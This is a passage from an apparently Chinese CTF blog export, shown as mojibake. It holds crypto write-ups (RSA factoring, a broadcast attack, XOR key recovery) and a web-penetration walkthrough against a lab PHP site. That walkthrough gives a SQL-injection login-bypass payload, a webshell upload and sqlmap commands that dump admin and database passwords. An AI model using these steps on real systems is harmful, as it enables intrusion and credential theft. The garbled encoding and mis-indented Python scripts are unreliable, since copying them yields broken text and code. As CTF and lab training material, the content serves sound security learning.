çŒœçŒœ\n\n**é¢˜ç›®ä¿¡æ¯**\n![](https://i.loli.net/2019/07/15/5d2bed18c10d646240.png)\nä¸‹è½½é™„ä»¶å¾—åˆ°`haha.txt`,504B0304å¾ˆæ˜æ˜¾æ˜¯Zipçš„æ–‡ä»¶å¤´\n![](https://i.loli.net/2019/07/15/5d2bec9c2196286692.png)\nHxDæ–°å»ºæ–‡ä»¶ï¼Œå°†`haha.txt`ä¸­çš„æ•°æ®copyè¿›å»ï¼Œå‘½åä¸º`1.zip`\n![](https://i.loli.net/2019/07/15/5d2bef001a76220461.png)\nè§£å‹1.zip,å‘ç°éœ€è¦è§£å‹å¯†ç ï¼Œç›´æ¥æš´åŠ›ç ´è§£å¾—åˆ°å¯†ç ä¸º123456\n![](https://i.loli.net/2019/07/15/5d2bec931c87584568.png)\nè§£å‹åå¾—åˆ°`flag.txt`\n![](https://i.loli.net/2019/07/15/5d2befba4435446450.png)\n\n## enc\n**é¢˜ç›®ä¿¡æ¯**\n\n![](https://i.loli.net/2019/07/15/5d2bff133687c21902.png)\nä¸‹è½½é™„ä»¶å¾—åˆ°`zero_one`\n![](https://i.loli.net/2019/07/15/5d2c002c9b32a11696.png)\nå°†ZEROæ›¿æ¢ä¸º0ï¼ŒONEæ›¿æ¢ä¸º1ï¼Œå¾—åˆ°ä¸€ä¸²äºŒè¿›åˆ¶å­—ç¬¦\n![](https://i.loli.net/2019/07/15/5d2c006f316f380902.png)\nå°†äºŒè¿›åˆ¶å­—ç¬¦å…ˆè½¬æ¢ä¸ºæ•´å‹å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²\n```python\nimport libnum\nn='0100110001101001001100000110011101001100011010010011000001110101010011000110100101000001011101010100100101000011001100000111010101001100011010010011000001100111010011000101001100110100011101000100110001101001010000010111010001001001010000110011010001110101010011000101001100110100011001110100110001010011010000010111010101001100011010010011010001110101010010010100001100110100011101000100110001010011001100000111010001001001010000110011010001110101010011000110100100110100011101010100100101000011001100000111010001001100010100110100000101110101010011000101001100110000011101000100110001010011010000010111010101001100011010010011010001100111010011000101001100110000011101000100100101000011001101000111010101001100011010010011010001110101010010010100001100110100011101010100110001010011010000010111010101001100010100110011000001110101010010010100001100110100011101010100110001101001001100000111010001001001010000110011010001110100010011000110100101000001011101000100110001010011001100000110011101001100011010010011010001110101010011000110100100110100011001110100110001101001010000010111010001001100011010010011000001110101010010010100001100110100011101000100110001101001010000010111010101001100011010010011010001110100010011000101001101000001011101000100100101000011001100000111010001001100010100110100000101110100010010010100001100110000011101010100110001101001001100000110011101001100010100010011110100111101'\nn=int(n,2)\nprint (n)\nprint libnum.n2s(n)\n```\n```python\nint(x, base=10) å‡½æ•°ç”¨äºå°†ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–æ•°å­—è½¬æ¢ä¸ºæ•´å‹ã€‚\nx -- å­—ç¬¦ä¸²æˆ–æ•°å­—ã€‚\nbase -- xçš„è¿›åˆ¶æ•°ï¼Œé»˜è®¤åè¿›åˆ¶ã€‚\n\nlibnum.n2s(n):å°†n(æ•´å‹)è½¬æ¢ä¸ºå­—ç¬¦ä¸²\n```\nè½¬æ¢ä¸ºå­—ç¬¦ä¸²åå¾—åˆ°ä¸€ä¸²base64\n![](https://i.loli.net/2019/07/15/5d2c032ce19fd49487.png)\nè§£å¯†base64å¾—åˆ°ä¸€ä¸²æ‘©æ–¯ç”µç \n![](https://i.loli.net/2019/07/15/5d2c042fe4e8618474.png)\nè§£å¯†æ‘©æ–¯ç”µç å¾—åˆ°flag:`ALEXCTFTH15O1SO5UP3RO5ECR3TOTXT`\n![](https://i.loli.net/2019/07/15/5d2c046b954f789240.png)\nä½†æ˜¯æ€ä¹ˆæäº¤éƒ½ä¸å¯¹ï¼Œæ•´ç†ä¹‹åæäº¤æˆåŠŸ\n`ALEXCTF{TH15_1S_5UP3R_5ECR3T_TXT}`\n## å‘Šè¯‰ä½ ä¸ªç§˜å¯†\n**é¢˜ç›®ä¿¡æ¯**\n![](https://i.loli.net/2019/07/15/5d2c0e6837a1d10853.png)\nä¸‹è½½é™„ä»¶å¾—åˆ°`Basic.txt`,ä¸¤æ®µ16è¿›åˆ¶æ•°æ®\n![](https://i.loli.net/2019/07/15/5d2c0e53dc7da80545.png)\n16è¿›åˆ¶è½¬æ•´å‹å†è½¬å­—ç¬¦ä¸²\n```python\nimport libnum\nn='636A56355279427363446C4A49454A7154534230526D6843'\nm='56445A31614342354E326C4B4946467A5769426961453067'\nn=int(n,16)\nm=int(m,16)\n#è½¬æ¢ä¸ºæ•´å‹\nprint (n)\nprint (m)\n#è½¬æ¢ä¸ºå­—ç¬¦ä¸²\nprint libnum.n2s(n)\nprint libnum.n2s(m)\n```\nå¾—åˆ°ä¸¤ä¸²base64\n![](https://i.loli.net/2019/07/15/5d2c12883153643908.png)\nè§£å¯†base64ï¼Œå¾—åˆ°7æ®µå­—ç¬¦ï¼Œç–‘ä¼¼é”®ç›˜å›´ç»•åŠ å¯†\n![](https://i.loli.net/2019/07/15/5d2c12c8b10b992809.png)\n```\nr5yG->T lp9I->O BjM->N tFhB->G T6uh->Y y7iJ->U QsZ-A bhM->N\n```\nè§£å¯†å¾—åˆ°ï¼š`TONGYUAN`(å¿…é¡»æ˜¯å¤§å†™)\n## è¯´æˆ‘ä½œå¼Šéœ€è¦è¯æ®\n**é¢˜ç›®ä¿¡æ¯**\n![](https://i.loli.net/2019/07/16/5d2d3318e64ff89463.png)\næ ¹æ®é¢˜ç›®æè¿°å°†åå…­è¿›åˆ¶æ•°ï¼ˆnï¼Œeï¼‰è½¬æ¢ä¸ºåè¿›åˆ¶å€¼ï¼Œç„¶åå†åˆ†è§£nï¼š[åœ¨çº¿åˆ†è§£](http://www.factordb.com/index.php)\n```py\nAlice: n=0x53a121a11e36d7a84dde3f5d73cf = 38456719616722997*44106885765559411\nBob:   n=0x99122e61dc7bede74711185598c7 = 49662237675630289*62515288803124247\nå…¬é’¥ï¼š e = 0x10001 = 65537\n```\nä¸‹è½½é™„ä»¶å¾—åˆ°ä¸€ä¸ªæ•°æ®åŒ…ï¼Œæ‰“å¼€è¿½è¸ªæµå‘ç°ä¿¡æ¯ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä»Aliceï¼ˆ192.168.0.13ï¼‰å’ŒBobï¼ˆ192.168.0.37ï¼‰çš„æ¯ä¸ªæ•°æ®åŒ…éƒ½åŒ…å«base64ç¼–ç çš„æœ‰æ•ˆè´Ÿè½½ã€‚\n![](https://i.loli.net/2019/07/16/5d2d5a2ee5c9718135.png)\néšä¾¿é€‰æ‹©å‡ æ¡base64è¿›è¡Œè§£å¯†ï¼Œè§£ç å¾—åˆ°åºåˆ—å·ï¼Œæ•°æ®å’Œç­¾å\n```python\nSEQ = 4; DATA = 0x2c29150f1e311ef09bc9f06735acL; SIG = 0x1665fb2da761c4de89f27ac80cbL;\nSEQ = 13; DATA = 0x3b04b26a0adada2f67326bb0c5d6L; SIG =0x2e5ab24f9dc21df406a87de0b3b4L;\nSEQ = 2; DATA = 0x8a03676745df01e16745145dd212L; SIG = 0x1378c25048c19853b6817eb9363aL;\nSEQ = 20; DATA = 0x674880905956979ce49af33433L; SIG = 0x198901d5373ea225cc5c0db66987L;\nSEQ = 0; DATA = 0x633282273f9cf7e5a44fcbe1787bL; SIG = 0x2b15275412244442d9ee60fc91aeL;\nSEQ = 28; DATA = 0x19688f112a61169c9090a4f9918dL; SIG =0x1448ac6eee2b2e91a0a6241e590eL;\n```\nçŒœæµ‹åº”è¯¥æ˜¯è§£å¯†æ•°æ®éƒ¨åˆ†ï¼Œä¾¿å¯ä»¥å¾—åˆ°flagã€‚\næ±‚è§£ç§é’¥ï¼š\n```python\nfrom Crypto.PublicKey import RSA\nimport gmpy\nn = long(3104649130901425335933838103517383)\ne = long(65537)\np = 49662237675630289\nq = 62515288803124247\nd = long(gmpy.invert(e, (p-1)*(q-1)))\nrsa = RSA.construct( (n, e, d) )\n```\nä½¿ç”¨ç§é’¥å°±å¯ä»¥å¯ä»¥è§£å¯†æ•°æ®\n```python\ndecrypted=rsa.decrypt(long('0x2c29150f1e311ef09bc9f06735acL', 16))\nprint str(hex(decrypted)).strip('0x').rstrip('L').decode('hex')\n```\nè¿™ä¼šäº§ç”Ÿæ¢è¡Œç¬¦ï¼ˆ\\ n 0x0aï¼‰ã€‚\næŸ¥çœ‹å…¶ä½™çš„è§£ç æ•°æ®åŒ…ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æ¯ä¸ªæ•°æ®éƒ½åŒ…å«ä¸€ä¸ªåŠ å¯†å­—ç¬¦ã€‚å°†è§£å¯†çš„å­—ç¬¦æ”¾åœ¨è¾“å‡ºå­—ç¬¦ä¸²ä¸­çš„åºåˆ—å·çš„ä½ç½®æ˜¯æœ‰æ„ä¹‰çš„ã€‚æˆ‘ä»¬ç°åœ¨éœ€è¦è§£å†³çš„æ˜¯å…·æœ‰ç›¸åŒåºåˆ—å·çš„å¤šä¸ªæ•°æ®åŒ…çš„é—®é¢˜ã€‚ä¸ºäº†ä»å¥½çš„æ•°æ®åŒ…ä¸­åˆ†ç¦»å‡ºåæ¶ˆæ¯ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨Aliceçš„ç§é’¥æ¥æ£€æŸ¥ç­¾åæ˜¯å¦ä¸æ•°æ®åŒ…åŒ¹é…ã€‚\n**è§£å¯†è„šæœ¬**ï¼š\n**å‡†å¤‡**ï¼š\n1.æˆ‘é¦–å…ˆéœ€è¦`pcapng`å¦å­˜ä¸ºpcapæ–‡ä»¶\n![](https://i.loli.net/2019/07/16/5d2d610910b3833623.png)\n2.éœ€è¦pythonåº“ï¼šgmpy2ï¼Œpycryptoï¼Œpypcapfile\n3.å°†è„šæœ¬å’Œ`bob_alice_encrypted.pcap`æ”¾åœ¨ä¸€èµ·ï¼Œç„¶åè¿è¡Œè„šæœ¬\n![](https://i.loli.net/2019/07/16/5d2d620feba9969829.png)\n```python\nfrom Crypto.PublicKey import RSA\nimport gmpy2\n\n# Alice's public encryption parameters\nn1 = long(1696206139052948924304948333474767)\ne = long(65537)\n\n# Bob's\nn2 = long(3104649130901425335933838103517383)\n\n# Yes! We can factorize the n\np1 = 38456719616722997\nq1 = 44106885765559411\np2 = 49662237675630289\nq2 = 62515288803124247\n\n# that means we can find the decryption exponent d\nphi1 = (p1-1)*(q1-1)\nphi2 = (p2-1)*(q2-1)\nd1 = long(gmpy2.invert(e, phi1))\nd2 = long(gmpy2.invert(e, phi2))\n\n# now construct the RSA with all the parameters\nrsa1 = RSA.construct( (n1, e, d1) )\nrsa2 = RSA.construct( (n2, e, d2) )\n\n# and decrypt the messages from a pcap file!\nfrom pcapfile import savefile\ncf = savefile.load_savefile(open(\"bob_alice_encrypted.pcap\"))\noutput = {}\nfor p in cf.packets:\n    pack = str(p.packet)[136:].decode('hex').decode('base64')\n    if 'DATA' in pack:\n        seq = int(pack.split(';')[0].split(' ')[2])\n        data = pack[16:].split(';')[0][:-1]\n        sig = long(pack.split(';')[2].split(' = ')[1], 16)\n        m = long(data, 16)\n        decrypted = rsa2.decrypt(m)\n        sigcheck = rsa1.sign(decrypted, '')[0]\n        val = str(hex(decrypted)).strip('0x').rstrip('L').zfill(2).decode('hex')\n        if sig == sigcheck:\n            output[seq] = val\nprint ''.join(output.values())\n```\nå‚è€ƒï¼š[Hack.lu 2015: Creative Cheating](https://honoki.net/2015/10/23/hack-lu-2015-creative-cheating/#more-482)\n## OldDriverï¼ˆå¹¿æ’­æ”»å‡»ï¼‰\n**é¢˜ç›®ä¿¡æ¯**\n![](https://i.loli.net/2019/07/16/5d2d91fa606e691545.png)\n**å¹¿æ’­æ”»å‡»**\n**æ”»å‡»æ¡ä»¶**:\nå¦‚æœä¸€ä¸ªç”¨æˆ·ä½¿ç”¨åŒä¸€ä¸ªåŠ å¯†æŒ‡æ•° e åŠ å¯†äº†åŒä¸€ä¸ªå¯†æ–‡ï¼Œå¹¶å‘é€ç»™äº†å…¶ä»– e ä¸ªç”¨æˆ·ã€‚é‚£ä¹ˆå°±ä¼šäº§ç”Ÿå¹¿æ’­æ”»å‡»ã€‚\n**æ”»å‡»åŸç†**\nè¿™é‡Œæˆ‘ä»¬å‡è®¾ e ä¸º 3ï¼Œå¹¶ä¸”åŠ å¯†è€…ä½¿ç”¨äº†ä¸‰ä¸ªä¸åŒçš„æ¨¡æ•° n1,n2,n3\nç»™ä¸‰ä¸ªä¸åŒçš„ç”¨æˆ·å‘é€äº†åŠ å¯†åçš„æ¶ˆæ¯ mï¼Œå¦‚ä¸‹\n```python\nc1=m^3 mod n1\nc2=m^3 mod n2\nc3=m^3 mod n3\n```\nè¿™é‡Œæˆ‘ä»¬å‡è®¾ n1,n2,n3\näº’ç´ ï¼Œä¸ç„¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†è§£ï¼Œç„¶åå¾—åˆ° dï¼Œè¿›è€Œç„¶åç›´æ¥è§£å¯†ã€‚\nåŒæ—¶ï¼Œæˆ‘ä»¬å‡è®¾` m<ni,1â‰¤iâ‰¤3`å¦‚æœè¿™ä¸ªæ¡ä»¶ä¸æ»¡è¶³çš„è¯ï¼Œå°±ä¼šä½¿å¾—æƒ…å†µå˜å¾—æ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œæˆ‘ä»¬æš‚ä¸è®¨è®ºã€‚\næ—¢ç„¶ä»–ä»¬äº’ç´ ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸­å›½å‰©ä½™å®šç†ï¼Œå¯å¾—\n```python\nm3 â‰¡ C mod n1n2n3\n```\næ­¤å¤–ï¼Œæ—¢ç„¶ `m<ni,1â‰¤iâ‰¤3`ï¼Œé‚£ä¹ˆæˆ‘ä»¬çŸ¥é“ `m3<n1n2n3` å¹¶ä¸” `C<m3<n1n2n3`ï¼Œé‚£ä¹ˆ `m3=C`ï¼Œæˆ‘ä»¬å¯¹ C å¼€ä¸‰æ¬¡æ ¹å³å¯å¾—åˆ° m çš„å€¼ã€‚\nå¯¹äºè¾ƒå¤§çš„ e æ¥è¯´ï¼Œæˆ‘ä»¬åªæ˜¯éœ€è¦æ›´å¤šçš„æ˜å¯†æ–‡å¯¹ã€‚\n\nä¸‹è½½é™„ä»¶å¾—åˆ°å¦‚ä¸‹æ•°æ®\n![](https://i.loli.net/2019/07/16/5d2d990fd5e3745049.png)\nç»™äº†10ç»„RSAçš„åŠ å¯†ä¿¡æ¯ï¼Œå…±æœ‰10ä¸ªå…¬é’¥ï¼Œå¹¶ä¸”æ‰€æœ‰çš„néƒ½æ˜¯äº’è´¨çš„ï¼Œå› æ­¤æƒ³åˆ°äº†ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»[CTFä¸­å¸¸è§çš„RSAç›¸å…³é—®é¢˜æ€»ç»“](https://findneo.github.io/180727rsa-attack/)\n**è§£å¯†è„šæœ¬**ï¼š\n```python\n#-*-coding: utf-8 -*-\nfrom functools import reduce \nimport gmpy \nimport json, binascii\n# ç”¨ gmpy ç®—æ¨¡åå…ƒç´ ï¼Œå›ä¼ è½¬æˆ int çš„ç»“æœ\ndef modinv(a, m):\n    return int(gmpy.invert(gmpy.mpz(a), gmpy.mpz(m)))\n\ndef chinese_remainder(n, a): #ä¸­å›½å‰©ä½™å®šç†\n    sum = 0 \n    prod = reduce(lambda a, b: a * b, n) \n    for n_i, a_i in zip(n, a):\n    p = prod // n_i\n    sum += a_i * modinv(p, n_i) * p \n    return int(sum % prod)\n\nnset = [] \ncset = []\nwith open(\"data.txt\") as f:  #é¢˜ç›®ç»™çš„n,e,c\n    now = f.read().strip('\\n')\n    now = eval(now)\n    #print now\n    for item in now:\n        nset.append(item['n'])\n        cset.append(item['c'])\n\nm = chinese_remainder(nset, cset)# ç”¨ä¸­å›½å‰©ä½™å®šç†è§£åŒä½™æ–¹ç¨‹ç»„ï¼Œæ¨å‡ºåŸå…ˆçš„ t^e\nm = int(gmpy.mpz(m).root(10)[0])# ç®— t^e çš„ 10 æ¬¡æ–¹æ ¹ï¼ˆå› ä¸º e=10ï¼‰ï¼Œæ¨å›åŸæœ¬çš„ t\nprint binascii.unhexlify(hex(m)[2:-1])# æŠŠç»“æœä»æ•°å­—å…ˆè½¬æˆ hex å†è½¬æˆå­—ä¸²\n```\n![](https://i.loli.net/2019/07/16/5d2d9ee13edc313695.png)\n## sleeping-guard\n**é¢˜ç›®ä¿¡æ¯**\n![](https://i.loli.net/2019/07/17/5d2f08de0a80758228.png)\né¢˜ç›®ç»™äº†æœåŠ¡å™¨åŠç«¯å£å·å’Œä¸€ä»½pythonä»£ç ï¼ˆæ”»é˜²ä¸–ç•Œç»™æ‰äº†ï¼‰\n\n```python\nimport base64\nfrom twisted.internet import reactor, protocol\nimport os\n \nPORT = 9013\n \nimport struct\ndef get_bytes_from_file(filename):  \n    return open(filename, \"rb\").read()  \n    \nKEY = \"[CENSORED]\"\n \ndef length_encryption_key():\n    return len(KEY)\n \ndef get_magic_png():\n    image = get_bytes_from_file(\"./sleeping.png\")\n    encoded_string = base64.b64encode(image)\n    key_len = length_encryption_key()\n    print 'Sending magic....'\n    if key_len != 12:\n        return ''\n    return encoded_string \n    \n \nclass MyServer(protocol.Protocol):\n    def connectionMade(self):\n        resp = get_magic_png()\n        self.transport.write(resp)\n \nclass MyServerFactory(protocol.Factory):\n    protocol = MyServer\n \nfactory = MyServerFactory()\nreactor.listenTCP(PORT, factory)\nreactor.run()\n```\næˆ‘ä»¬ä»æœåŠ¡å™¨æ”¶åˆ°äº†base64ç¼–ç çš„æ–‡æœ¬ã€‚\n![](https://i.loli.net/2019/07/17/5d2f092c6291077235.png)\nå®ƒå¯èƒ½æ˜¯pythonä»£ç ä¸­æåˆ°çš„pngå›¾åƒæ‰€ä»¥æˆ‘ä»¬è§£ç å¹¶å°†å…¶ä¿å­˜åˆ°ä¸ºout.pngï¼š\n```python\nnc 111.198.29.45 47726 | base64 --decode > out.png\n```\nè¯•å›¾æ‰“å¼€å›¾åƒï¼Œå›¾åƒæŸ¥çœ‹å™¨æ— æ³•æ‰“å¼€æ–‡ä»¶ã€‚ä½¿ç”¨æ–‡æœ¬æŸ¥çœ‹å™¨æ‰“å¼€æ–‡ä»¶ï¼Œçœ‹åˆ°æ²¡æœ‰PNGæ ‡å¤´ã€‚æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æœ‰å›¾åƒï¼Œä½†å®ƒä»¥æŸç§æ–¹å¼ç¼–ç ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºå¦‚ä½•è§£ç å®ƒã€‚\n![](https://i.loli.net/2019/07/17/5d2f0ef57606323996.png)\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹è„šæœ¬ï¼Œç­”æ¡ˆå¯èƒ½å°±åœ¨é‚£é‡Œã€‚åœ¨ä½¿ç”¨base64å¯¹æ–‡ä»¶è¿›è¡Œç¼–ç åï¼Œè„šæœ¬å°†æ£€æŸ¥åŠ å¯†å¯†é’¥çš„å¤§å°æ˜¯å¦ä¸º12ã€‚\n```python\nå…³é”®ä»£ç ï¼š\nKEY = \"[CENSORED]\"\n \ndef length_encryption_key():\n    return len(KEY)\n    \n    if key_len != 12:\n```\né™¤äº†ç¼–ç æœ¬èº«ä¹‹å¤–ï¼Œæˆ‘ä»¬åœ¨è„šæœ¬ä¸­çœ‹ä¸åˆ°ä»»ä½•åŠ å¯†ï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾åœ¨åŸå§‹è„šæœ¬ä¸­ä½¿ç”¨12å­—èŠ‚é•¿å¯†é’¥å®ŒæˆåŠ å¯†ã€‚ä½†åŠ å¯†ä»€ä¹ˆï¼Ÿæœ‰åäº¿ç§é€‰æ‹©ï¼Œæˆ‘ä»¬å¦‚ä½•æ‰¾åˆ°åˆé€‚çš„è§£å¯†ç®—æ³•ï¼Ÿå—¯ï¼Œç­”æ¡ˆå¾ˆç®€å• - è¿™æ˜¯ä¸€ä¸ªCTFï¼Œç®¡ç†å‘˜çŸ¥é“æˆ‘ä»¬ä¸èƒ½å°è¯•æ‰€æœ‰å¯èƒ½çš„è§£å¯†æ–¹æ³•ï¼Œæ‰€ä»¥å®ƒå¯èƒ½æ˜¯å¹³åº¸çš„é€‰æ‹©ï¼šå¼‚æˆ–ã€‚\n\nåœ¨é€‰æ‹©æˆ‘ä»¬çš„åŠ å¯†æ–¹æ³•åï¼Œè®©æˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ‰¾åˆ°å¯†é’¥æœ¬èº«ã€‚æˆ‘ä»¬çŸ¥é“è¯¥æ–‡ä»¶æ˜¯PNGå›¾åƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†åŠ å¯†æ–‡ä»¶çš„å‰12ä¸ªå­—èŠ‚ä¸æ­£å¸¸PNGæ–‡ä»¶çš„å‰12ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–ã€‚\n```python\n89 50 4E 47 0D 0A 1A 0A 00 00 00 0D XOR DE 3F 0F 2F 52 4B 45 41 65 79 21 32  == 57 6F 41 68 5F 41 5F 4B 65 79 21 3F  \n```\nåœ¨ASCIIä¸­æ˜¯ï¼šâ€œ WoAh_A_Keyï¼ï¼Ÿâ€\nç°åœ¨æˆ‘ä»¬æœ‰äº†å¯†é’¥ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œpythonè„šæœ¬ï¼Œè¦åœ¨Linuxç¯å¢ƒä¸‹è¿è¡Œï¼Œå¾—åˆ°çš„å›¾ç‰‡æ‰èƒ½æ‰“å¼€ï¼Œwindowsç¯å¢ƒä¸‹ä¸è¡Œ\n```python\ndef xor(data, key):\n    l = len(key)\n    return bytearray((\n        (data[i] ^ key[i % l]) for i in range(0,len(data))\n    ))\n \n# Read the encrypted image as bytearray\ndata = bytearray(open('out.png', 'rb').read())\n \n# This is our key as bytearray: \"WoAh_A_Key!?\"\nkey = bytearray([0x57, 0x6f, 0x41, 0x68, 0x5f, 0x41, 0x5f, 0x4b, 0x65, 0x79, 0x21, 0x3f])\n \nwith open('decrypted.png', 'w') as file_:\n    file_.write(xor(data,key))\n```\nå¾—åˆ°flag\n![](https://i.loli.net/2019/07/17/5d2f1b8f3010a75409.png)\n## wtc_rsa_bbq\n**é¢˜ç›®ä¿¡æ¯**\n![](https://i.loli.net/2019/07/18/5d302890e5bd654792.png)\nä¸‹è½½é™„ä»¶å¾—åˆ°`cry200`,ç”¨HxDæ‰“å¼€\n![](https://i.loli.net/2019/07/18/5d3029df99a4151271.png)\næ ¹æ®æ–‡ä»¶å¤´ï¼š`504B0304`ç¡®å®šè¯¥æ–‡ä»¶ä¸ºzipï¼Œæ·»åŠ åç¼€`.zip`,å¾—åˆ°å…¬é’¥`key.pem`å’Œå¯†æ–‡`cipher.bin`\n![](https://i.loli.net/2019/07/18/5d302a815e9f395102.png)\nå°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨RsaCtfToolä¸‹\nç›´æ¥è¿è¡Œ`python RsaCtfTool.py --publickey key.pem --uncipherfile  cipher.bin`\nå¾—åˆ°flag\n![](https://i.loli.net/2019/07/18/5d3028ca0c52d10590.png)\n## Handicraft_RSA\n**é¢˜ç›®ä¿¡æ¯**\n![](https://i.loli.net/2019/07/18/5d3044864eb1737292.png)\nä¸‹è½½é™„ä»¶å¾—åˆ°`Handicraft_RSA`æ–‡ä»¶ï¼Œç”¨notepadæ‰“å¼€ï¼Œå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯(åŠ å¯†ç®—æ³•ï¼Œå…¬é’¥ï¼Œå¯†æ–‡)\n![](https://i.loli.net/2019/07/18/5d3044d13963818901.png)\n![](https://i.loli.net/2019/07/18/5d3045037abd227919.png)\nå°†`PUBLIC KEY`ä¿å­˜ä¸º`1.pem`,ä½¿ç”¨RsaCtfToolè½¬åŒ–ä¸º`nï¼Œe`å½¢å¼\n![](https://i.loli.net/2019/07/18/5d30463d91c2732963.png)\n[åœ¨çº¿åˆ†è§£](http://www.factordb.com/)åˆ†è§£nå¾—åˆ°p,q\n**è§£å¯†è„šæœ¬**ï¼š\n```python\nimport base64\nimport gmpy2\nfrom Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\n\nn=21702007965967851183912845012669844623756908507890324243024055496763943595946688940552416734878197459043831494232875785620294668737665396025897150541283087580428261036967329585399916163401369611036124501098728512558174430431806459204349427025717455575024289926516646738721697827263582054632714414433009171634156535642801472435174298248730890036345522414464312932752899972440365978028349224554681969090140541620264972373596402565696085035645624229615500129915303416150964709569033763686335344334340374467597281565279826664494938820964323794098815428802817709142950181265208976166531957235913949338642042322944000000001\np=139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001\nq=155617827023249833340719354421664777126919280716316528121008762838820577123085292134385394346751341309377546683859340593439660968379640585296350265350950535158375685103003837903550191128377455111656903429282868722284520586387794090131818535032744071918282383650099890243578253423157468632973312000000000000001\ne=65537\nd = gmpy2.invert(e,(p-1)*(q-1))\n\nkey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))\nmsg = base64.b64decode(\"eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==\")   \n    for _ in xrange(20):\n        enc = key.decrypt(msg)\n        msg = enc\nprint (msg)\n```\n![](https://i.loli.net/2019/07/18/5d30457c9c33a46621.png)","tags":["Write-up","Crypto"],"categories":["CTF"]},{"title":"è®°ä¸€æ¬¡æ¼æ´æŒ–æ˜","url":"/posts/54441.html","content":"\n## é¢˜ç›®ä¸€ï¼šPHPç½‘é¡µ\n\n## 0x01 SQlæ³¨å…¥\nOWASPæ‰«æ,çˆ†å‡ºsqlæ³¨å…¥æ¼æ´\n![](https://i.loli.net/2019/07/12/5d2819e4517be17785.png)\nåˆ©ç”¨çˆ†å‡ºçš„ä¸‡èƒ½é’¥åŒ™`ï¼ˆZAP' OR '1'='1' -- ï¼‰`è¿›è¡Œç™»å½•\n![](https://i.loli.net/2019/07/12/5d2819e4516a893245.png)\nç™»å½•æˆåŠŸ\n![](https://i.loli.net/2019/07/12/5d281a8c0e79587010.png)\n## 0x02 æ–‡ä»¶ä¸Šä¼ \nç¬¬ä¸€æ­¥ç™»å½•æˆåŠŸåï¼Œå‘ç°ç–‘ä¼¼ä¸Šä¼ ç‚¹\n![](https://i.loli.net/2019/07/12/5d281a8c09d0471290.png)\nç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬\n![](https://i.loli.net/2019/07/12/5d281a8c0e6a986304.png)\nä¸Šä¼ æˆåŠŸ\n![](https://i.loli.net/2019/07/12/5d281a8c0e4f041942.png)\nèœåˆ€è¿æ¥\n![](https://i.loli.net/2019/07/12/5d281c01ebb7b22332.png)\ngetshell,å°±å¯ä»¥å¹²åäº‹æ‹‰\n![](https://i.loli.net/2019/07/12/5d281c021cea933698.png)\n## 0x03 SQLæ³¨å…¥\nåœ¨ç™»å½•ç•Œé¢æŸ¥è¯¢å¤„å‘ç°ç–‘ä¼¼sqlæ³¨å…¥å¤„\n![](https://i.loli.net/2019/07/12/5d282a31a396411657.png)\næŠ“åŒ…å‘ç°å˜é‡å\n![](https://i.loli.net/2019/07/12/5d282a31c349814371.png)\n\n![](https://i.loli.net/2019/07/12/5d281c01ed58d32527.png)sqlmapä¸€é”®æ³¨å…¥\n\n1.æŸ¥è¯¢æ•°æ®åº“\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --dbs`\n![](https://i.loli.net/2019/07/12/5d281c3014d6768887.png)\n2.æŸ¥è¯¢gradeæ•°æ®åº“ä¸­è¡¨å\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --tables -D grade`\n![](https://i.loli.net/2019/07/12/5d281dc62de6797635.png)\n3.æŸ¥è¯¢gradeåº“ä¸­adminsè¡¨ä¸­çš„å­—æ®µ\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --columns -T admins -D grade`\n![](https://i.loli.net/2019/07/12/5d281d4c80c6431326.png)\n4.æŸ¥è¯¢gradeåº“ä¸­adminsè¡¨ä¸­çš„å­—æ®µid,name,pass\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --dump -C \"id,name,pass\" -T admins -D grade`\n![](https://i.loli.net/2019/07/12/5d281dc62dd0438524.png)\n\n5.çˆ†ç ´phpmyadminåå°å¯†ç \n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --users --password`\n![](https://i.loli.net/2019/07/12/5d281c01f1b3142205.png)\nç›´æ¥ç™»å½•åå° è´¦å·ï¼šroot å¯†ç ï¼š123456\n![](https://i.loli.net/2019/07/12/5d281f39a689a97473.png)\nç™»å½•æˆåŠŸ\n![](https://i.loli.net/2019/07/12/5d281ed36fc4150810.png)\n## 0X04 XSS\nåå°„å‹Xss 